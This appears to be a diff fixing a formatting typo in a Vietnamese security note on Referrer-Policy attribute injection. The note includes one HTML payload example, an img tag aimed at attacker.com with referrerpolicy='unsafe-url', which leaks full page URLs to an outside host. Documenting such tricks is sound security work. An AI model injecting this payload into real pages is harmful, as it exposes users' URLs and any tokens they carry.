@@ -175,7 +175,7 @@ Content-Type: text/html
 ```
 
 #### Attribute Injection 
-- Các phần tử riêng lẻ cũng có thể bị thay đổi bằng thuộc tính r`eferrerpolicy=` 
+- Các phần tử riêng lẻ cũng có thể bị thay đổi bằng thuộc tính `referrerpolicy=` 
 ```html
 <img src="http://attacker.com" referrerpolicy="unsafe-url">
 ```
